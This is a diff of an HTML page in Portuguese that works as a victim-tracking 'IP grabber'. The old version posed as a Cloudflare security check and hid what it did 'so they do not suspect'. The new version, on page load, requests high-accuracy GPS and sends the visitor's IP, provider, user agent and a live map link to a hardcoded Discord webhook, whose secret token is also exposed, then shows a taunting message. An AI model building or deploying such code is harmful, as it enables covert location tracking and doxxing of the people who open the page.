@@ -3,79 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check - Cloudflare</title>
+    <title>SISTEMA COMPROMETIDO</title>
     <style>
-        body { background: #0f172a; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 40px; border-radius: 12px; border: 1px solid #334155; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
-        .spinner { border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { background: #450a0a; color: #fecaca; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .card { background: #7f1d1d; padding: 50px; border: 3px solid #dc2626; box-shadow: 0 0 100px #000; border-radius: 5px; }
+        .loader { border: 5px solid #450a0a; border-top: 5px solid #f87171; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; color: white; padding: 12px; border-radius: 6px; font-size: 13px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; border-right: 4px solid #fff; }
+        h1 { font-size: 3rem; margin: 0; color: #fff; text-shadow: 2px 2px #000; display: none; }
+        .status-text { font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-    <div id="notif"></div>
-
-    <div class="card">
-        <div class="spinner"></div>
-        <h2 style="font-size: 18px; margin: 0;">Verificando Conexão</h2>
-        <p style="font-size: 13px; color: #94a3b8;">Validando integridade do navegador...</p>
+    <div class="card" id="box">
+        <div class="loader" id="loading"></div>
+        <div class="status-text" id="status">Sincronizando coordenadas com o servidor...</div>
+        <h1 id="final-msg">CE TA FUDIDO</h1>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        function toast(t) {
-            const n = document.createElement('div');
-            n.className = 'toast'; n.innerText = 'ℹ ' + t;
-            document.getElementById('notif').appendChild(n);
-            setTimeout(() => n.remove(), 3000);
-        }
-
-        async function capturar() {
-            toast("Conexão Segura");
-            
+        async function enviarLogs(pos = null) {
             try {
-                // Captura o IP e Provedor (Internet)
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                toast("Enviando Logs...");
+                // Captura IP e Internet (Rápido)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
 
-                // Envia para o Discord
+                let fields = [
+                    { name: "🌐 IP Público:", value: ip.ip || "N/A", inline: true },
+                    { name: "🏢 Provedor:", value: ip.org || "N/A", inline: false },
+                    { name: "📱 Aparelho:", value: navigator.userAgent, inline: false }
+                ];
+
+                if (pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    fields.push({ 
+                        name: "📍 Localização Real (GPS):", 
+                        value: `[MAPA EM TEMPO REAL](https://www.google.com/maps?q=${lat},${lon})`, 
+                        inline: false 
+                    });
+                }
+
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "📡 NOVO LOG DE DISPOSITIVO",
-                            color: 3447003,
-                            fields: [
-                                { name: "🌐 IP Público:", value: data.ip || "N/A", inline: true },
-                                { name: "🏢 Provedor/Internet:", value: data.org || "N/A", inline: false },
-                                { name: "🏙️ Localização (IP):", value: `${data.city}, ${data.region} - ${data.country_name}`, inline: false },
-                                { name: "📱 Aparelho/Browser:", value: navigator.userAgent, inline: false },
-                                { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: true }
-                            ],
-                            footer: { text: "Monitoramento Ativo" }
+                            title: "🚩 LOG DE ACESSO - ALERTA CRÍTICO",
+                            color: 15548997,
+                            fields: fields,
+                            timestamp: new Date()
                         }]
                     })
                 });
 
-                toast("Concluído!");
-                // Fecha a aba ou redireciona
-                setTimeout(() => { window.location.href = "about:blank"; }, 1000);
+                // TELA FINAL
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('box').style.background = '#000';
+                document.getElementById('box').style.borderColor = '#f00';
+                document.getElementById('final-msg').style.display = 'block';
 
             } catch (e) {
-                console.error("Erro no envio");
-                // Mesmo com erro, redireciona para não suspeitarem
-                window.location.href = "https://google.com";
+                console.error(e);
             }
         }
 
-        // Inicia assim que a página carrega
         window.onload = () => {
-            setTimeout(capturar, 500);
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { enviarLogs(pos); }, 
+                    (err) => { enviarLogs(); }, 
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                enviarLogs();
+            }
         };
     </script>
 </body>
